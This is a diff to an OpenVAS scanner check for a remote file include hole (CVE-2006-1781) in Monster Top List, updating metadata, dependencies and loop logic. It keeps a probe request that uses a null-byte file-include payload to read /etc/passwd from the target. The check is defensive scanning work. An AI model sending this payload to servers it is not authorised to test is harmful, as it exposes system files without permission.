@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: mtl_remote_file_include.nasl 4489 2016-11-14 08:23:54Z teissa $
+# $Id: mtl_remote_file_include.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: Monster Top List Remote File Include
 #
 # Authors:
@@ -41,62 +41,47 @@ This flaw is only exploitable if PHP's 'register_globals' is enabled.";
 
 tag_solution = "Unknown at this time.";
 
-if (description) {
-  script_id(80073);;
-  script_version("$Revision: 4489 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
+if (description)
+{
+  script_id(80073);
+  script_version("$Revision: 5779 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
   script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_bugtraq_id(17546);
   script_cve_id("CVE-2006-1781");
   script_xref(name:"OSVDB", value:"24650");
-
-  name = "Monster Top List Remote File Include";
-  script_name(name);
- 
- 
-  summary = "Checks for file includes in sources/functions.php";
- 
+  script_name("Monster Top List Remote File Include");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
   script_family("Web application abuses");
-
   script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
-
-  script_dependencies("http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
   script_xref(name : "URL" , value : "http://pridels.blogspot.com/2006/04/monstertoplist.html");
+
   exit(0);
 }
 
-
-include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
-dirs = make_list("/toplist", cgi_dirs());
+foreach dir( make_list_unique( "/toplist", cgi_dirs( port:port ) ) ) {
 
-# Loop through CGI directories.
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+
   # Try to exploit the flaw in sources/functions.php to read /etc/passwd.
-  req = http_get(
-    item:string(
-      dir, "/sources/functions.php?",
-      "root_path=/etc/passwd%00"
-    ), 
-    port:port
-  );
+  req = http_get( item:string( dir, "/sources/functions.php?root_path=/etc/passwd%00"), port:port );
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (res == NULL) exit(0);
+  if (res == NULL) continue;
 
   # There's a problem if...
   if (
@@ -124,3 +109,5 @@ foreach dir (dirs) {
     exit(0);
   }
 }
+
+exit( 99 );
